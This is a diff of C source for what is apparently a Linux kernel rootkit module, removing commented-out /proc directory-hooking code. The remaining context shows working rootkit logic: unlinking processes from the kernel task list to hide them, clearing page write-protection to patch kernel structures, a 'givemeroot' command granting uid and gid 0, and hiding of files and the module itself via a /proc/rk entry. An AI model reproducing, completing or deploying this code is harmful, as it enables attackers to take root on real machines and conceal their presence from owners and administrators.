@@ -12,12 +12,10 @@
 
 char name[] = "";
 
-//static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
 
 struct proc_dir_entry *next, *parent, *subdir;
 
-//static int (*proc_iterate_orig)(struct file *, struct dir_context *);
 static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 
 static int size, temp;
@@ -133,7 +131,6 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
                 if(kstrtol(pid_s, 10, &pid));
                 if(pid == p->pid)
                 {
-                    //printk("--------%ld: %s\n", pid, p->comm);
                     proc_to_hide[current_pid] = p;
                     p->tasks.prev->next = p->tasks.next;
                     p->tasks.next->prev = p->tasks.prev;
@@ -184,33 +181,6 @@ static void set_addr_ro(void *addr)
     pte->pte = pte->pte &~_PAGE_RW;
 }
 
-/*
-static int proc_filldir_new(void *buf, const char *name, int namelen,
-    loff_t offset, u64 ino, unsigned d_type)
-{
-    int i;
-
-    for(i = 0; i < current_pid; i++)
-    {
-        if(!strcmp(name, pids_to_hide[i]))
-            return 0;
-    }
-
-    if(!strcmp(name, "rk"))
-        return 0;
-
-    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
-}
-
-static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
-{
-    proc_filldir_orig = ctx->actor;
-    *((filldir_t *)&ctx->actor) = &proc_filldir_new;
-
-    return proc_iterate_orig(filp, ctx);
-}
-*/
-
 static int fs_filldir_new(void *buf, const char *name, int namelen,
     loff_t offset, u64 ino, unsigned d_type)
 {
@@ -241,12 +211,6 @@ static int __init procfs_init(void)
     if(proc_rk == NULL)
         return 0;
 
-    /*
-    proc_root = proc_rk->parent;
-    if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
-        return 0;
-    */
-
     sprintf(module_status,
         "CMDS: \n\
     -> givemeroot  - uid and gid 0 for writing process \n\
@@ -263,15 +227,6 @@ static int __init procfs_init(void)
     -> Module hidden?: %d \n", hide_files, module_hidden);
     size = strlen(module_status);
     temp = size;
-
-    // TODO: FIX?
-    /*
-    proc_fops = ((struct file_operations*)proc_root->proc_fops);
-    proc_iterate_orig = proc_fops->iterate;
-    set_addr_rw(proc_fops);
-    proc_fops->iterate = proc_iterate_new;
-    set_addr_ro(proc_fops);
-    */
 
     return 1;
 }
@@ -305,14 +260,6 @@ static void procfs_clean(void)
         remove_proc_entry("rk", NULL);
         proc_rk = NULL;
     }
-    /*
-    if(proc_fops != NULL && proc_iterate_orig != NULL)
-    {
-        set_addr_rw(proc_fops);
-        proc_fops->iterate = proc_iterate_orig;
-        set_addr_ro(proc_fops);
-    }
-    */
 }
 
 static void fs_clean(void)
